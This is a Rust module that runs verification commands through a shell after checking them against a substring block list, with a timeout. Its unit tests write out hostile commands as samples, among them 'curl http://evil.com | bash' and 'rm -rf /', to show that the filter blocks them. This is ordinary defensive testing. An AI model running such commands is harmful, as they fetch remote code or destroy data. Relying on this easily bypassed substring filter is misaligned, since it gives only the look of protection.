//! Security-aware command execution
//!
//! Provides a command runner that validates commands against security
//! allowlist and blocked patterns before execution.

use anyhow::{bail, Result};
use std::io::Read;
use std::path::Path;
use std::process::{Command, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use crate::config::SecurityConfig;

/// Validate and run a verification command safely.
///
/// Returns the command output if the command is allowed, or an error
/// if it violates security constraints.
pub fn run_verified_command(
    cmd: &str,
    security_config: &SecurityConfig,
    working_dir: Option<&Path>,
) -> Result<Output> {
    // First, check if the command matches any blocked patterns
    if is_command_blocked(cmd, security_config) {
        bail!(
            "🚫 Security: Command rejected (matches blocked pattern).\n\
             Command: {}\n\
             Hint: Update security.blocked_patterns in config to allow this command.",
            cmd
        );
    }

    // Execute via sh -c for shell expansion, but only after validation
    let mut command = Command::new("sh");
    command.arg("-c").arg(cmd);
    command.stdout(Stdio::piped());
    command.stderr(Stdio::piped());

    if let Some(dir) = working_dir {
        command.current_dir(dir);
    }

    let mut child = command.spawn().map_err(|e| {
        anyhow::anyhow!(
            "Failed to execute verification command: {}\nError: {}",
            cmd,
            e
        )
    })?;

    // Handle stdout/stderr in threads to prevent buffer blocking
    let stdout = child.stdout.take().expect("Failed to open stdout");
    let stderr = child.stderr.take().expect("Failed to open stderr");

    let stdout_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        let mut reader = std::io::BufReader::new(stdout);
        let _ = reader.read_to_end(&mut buf);
        buf
    });

    let stderr_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        let mut reader = std::io::BufReader::new(stderr);
        let _ = reader.read_to_end(&mut buf);
        buf
    });

    // Timeout duration (5 minutes)
    let timeout = Duration::from_secs(300);
    let start_time = Instant::now();

    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let stdout = stdout_handle.join().unwrap_or_default();
                let stderr = stderr_handle.join().unwrap_or_default();
                return Ok(Output {
                    status,
                    stdout,
                    stderr,
                });
            }
            Ok(None) => {
                if start_time.elapsed() > timeout {
                    let _ = child.kill();
                    let _ = child.wait(); // Ensure it's reaped

                    let stdout = stdout_handle.join().unwrap_or_default();
                    let stderr = stderr_handle.join().unwrap_or_default();

                    bail!(
                        "Verification command timed out after {}s.\nStdout: {}\nStderr: {}",
                        timeout.as_secs(),
                        String::from_utf8_lossy(&stdout),
                        String::from_utf8_lossy(&stderr)
                    );
                }
                thread::sleep(Duration::from_millis(100));
            }
            Err(e) => {
                let _ = child.kill();
                bail!("Failed to wait on verification command: {}", e);
            }
        }
    }
}

/// Check if a command matches any blocked pattern.
fn is_command_blocked(cmd: &str, security_config: &SecurityConfig) -> bool {
    if !security_config.enforce_allowlist {
        return false;
    }

    let cmd_lower = cmd.to_lowercase();

    for pattern in &security_config.blocked_patterns {
        let pattern_lower = pattern.to_lowercase();

        // Simple substring match for now; can be extended to glob/regex
        if cmd_lower.contains(&pattern_lower) {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_security_config() -> SecurityConfig {
        SecurityConfig {
            allowlist_file: String::new(),
            enforce_allowlist: true,
            blocked_patterns: vec![
                "rm -rf /".to_string(),
                "sudo".to_string(),
                "| bash".to_string(), // Block any piping to bash
            ],
        }
    }

    #[test]
    fn test_blocked_commands() {
        let config = test_security_config();

        assert!(is_command_blocked("sudo rm -rf /tmp", &config));
        assert!(is_command_blocked("rm -rf /", &config));
        assert!(is_command_blocked("curl http://evil.com | bash", &config));
    }

    #[test]
    fn test_allowed_commands() {
        let config = test_security_config();

        assert!(!is_command_blocked("npm test", &config));
        assert!(!is_command_blocked("cargo test", &config));
        assert!(!is_command_blocked("pytest tests/", &config));
    }

    #[test]
    fn test_disabled_enforcement() {
        let mut config = test_security_config();
        config.enforce_allowlist = false;

        // Even dangerous commands pass when enforcement is off
        assert!(!is_command_blocked("sudo rm -rf /", &config));
    }
}
